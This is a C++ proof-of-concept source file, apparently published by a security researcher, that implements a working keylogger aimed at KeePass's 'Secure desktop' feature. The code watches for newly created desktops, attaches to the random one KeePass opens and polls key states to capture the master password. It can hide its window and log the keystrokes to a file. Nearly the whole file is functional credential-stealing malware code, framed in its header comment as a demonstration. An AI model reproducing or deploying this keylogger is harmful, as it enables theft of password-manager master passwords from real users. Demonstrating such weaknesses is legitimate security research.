/*

This is a simple POC to show that Master Password can be easily keylogged from "Secure desktop".

The "secure desktop" is not really Winlogon screen (the one used by UAC prompt or ctrl+alt+delete sequence), 
but rather another desktop - of random name - created by the keepass. The user running KeePass must have full 
privileges to the desktop, thus we can create keylogger that attaches to new desktops and keyloggs Master Password.

This is _not_ a security issue in KeePass - it's just how it works.

Still, be sure to enable "Secure desktop" feature - at least must keyloggers won't work out of box.

Author: Adrian Denkiewicz

*/

#include <vector>
#include <string>

#include <Windows.h>
#include <stdio.h>

#include "cli11.h"

// special keys will be logged using <KEY> formatting
// some keys are missing, this is just a POC
bool handleSpecial(int key, std::string& out) {
	switch (key) {
	case VK_RETURN:
		out = "<enter>";
		return true;	

	case VK_BACK:
		out = "<backspace>";
		return true;

	case VK_DELETE:
		out = "<delete>";
		return true;
	
	case VK_END:
		out = "<end>";
		return true;

	case VK_HOME:
		out = "<home>";
		return true;

	case VK_INSERT:
		out = "<insert>";
		return true;

	case VK_CAPITAL:
		out = "<caps lock>";
		return true;

	case VK_TAB:
		out = "<tab>";
		return true;

	case VK_UP:
		out = "<up>";
		return true;

	case VK_DOWN:
		out = "<down>";
		return true;

	case VK_LEFT:
		out = "<left>";
		return true;

	case VK_RIGHT:
		out = "<right>";
		return true;

	case VK_LSHIFT:
		out = "<lshift>";
		return true;
	
	case VK_RSHIFT:
		out = "<rshift>";
		return true;

	case VK_LCONTROL:
		out = "<lctrl>";
		return true;

	case VK_RCONTROL:
		out = "<rctrl>";
		return true;

	case VK_LMENU:
		out = "<lalt>";
		return true;

	case VK_RMENU:
		out = "<ralt>";
		return true;

	// ignore basic info
	case VK_SHIFT:
	case VK_CONTROL:
	case VK_MENU:
		out = "";
		return true;

	default:
		return false;
	}
}

BOOL CALLBACK desktopEnumHandler(_In_ LPTSTR lpszDesktop, _In_ LPARAM) {
	static std::vector<std::string> knownDesktops;
	static auto currentDesktop = GetThreadDesktop(GetCurrentThreadId());

	// check if this is a new desktop - otherwise ignore
	if (std::find(knownDesktops.begin(), knownDesktops.end(), lpszDesktop) == knownDesktops.end()) {
		knownDesktops.push_back(lpszDesktop);

		// KeePass desktop's name is random but always starts with 'D'
		if (lpszDesktop[0] == 'D' && std::string(lpszDesktop) != "Default") {			
			auto kDesktop = OpenDesktop(lpszDesktop, NULL, FALSE, GENERIC_ALL);

			if (kDesktop) {
				SetThreadDesktop(kDesktop);

				// almost empty callback, as long as EnumWindows returns TRUE, Secure Desktop is still working
				auto doNothing = static_cast<WNDENUMPROC>([](HWND, LPARAM) -> BOOL { Sleep(10); return TRUE; });

				// windows needs to be initialized, so we loop until there's at least one
				while (!EnumWindows(doNothing, 0));
				printf("Current desktop: %s\n", lpszDesktop);

				while (EnumWindows(doNothing, 0)) {
					for (int key = 8; key <= 190; key++) {
						if (GetAsyncKeyState(key) & 1) {
							std::string special;

							if (handleSpecial(key, special)) {
								if (!special.empty())
									printf("%s\n", special.c_str());
							}
							else
								printf("(0x%x) %c\n", key, key);
						}
					}

					fflush(stdout);
				}

				SetThreadDesktop(currentDesktop);
				CloseDesktop(kDesktop);
			}
		}
	}

	return TRUE;
}

int main(int argc, char *argv[]) {
	CLI::App app{ "KeePass Keylogger for Secure Desktop" };

	std::string fileName;
	app.add_option("-f,--file", fileName, "Log to TEXT file instead of stdout");
	app.add_flag_function("-b,--background", [](size_t) { ShowWindow(GetConsoleWindow(), SW_HIDE); }, "Run in background");

	CLI11_PARSE(app, argc, argv);

	FILE *stream{ nullptr };
	std::shared_ptr<FILE> pStream(stream, [](FILE *stream) { if (stream) ::fclose(stream); });

	// beware that freopen_s will get exclusive access, workaround: https://devblogs.microsoft.com/oldnewthing/20180221-00/?p=98065
	if (!fileName.empty())
		freopen_s(&stream, fileName.c_str(), "a", stdout);
	
	while (true) {
		// beware of NULL as first arg: https://stackoverflow.com/questions/13323174/all-desktops-named-by-enumdesktops-fail-to-opendesktop-with-error-2-file-not-fo
		EnumDesktops(GetProcessWindowStation(), desktopEnumHandler, NULL);
		Sleep(50);
	}
}